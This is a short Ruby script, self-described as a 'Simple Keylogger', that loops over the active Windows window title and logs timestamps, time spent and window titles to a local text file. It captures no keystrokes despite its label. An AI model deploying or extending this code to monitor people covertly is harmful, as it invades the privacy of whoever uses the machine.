#!usr/bin/ruby
#Simple Keylogger in Ruby
#(C) Doddy Hackman 2011

require 'Win32API'
require 'date'
require './util'



def capturar

	
	title1 = Util.getActiveWindowTitle
	initTime = Time.now

	while 1
		title2 = Util.getActiveWindowTitle
		
		
		if (title1 != title2)
			timeElapsed = Time.now - initTime 	
			formatedTime = DateTime.now.strftime('%Y/%m/%d %H:%M:%S')
			Util.saveToFile('activeWindows.txt',"#{formatedTime},#{timeElapsed},#{title1}")
			#puts timeElapsed
			title1 = title2
			initTime = Time.now
		end
	end
	
end

capturar() #Start the keylogger

# ¿ The End ?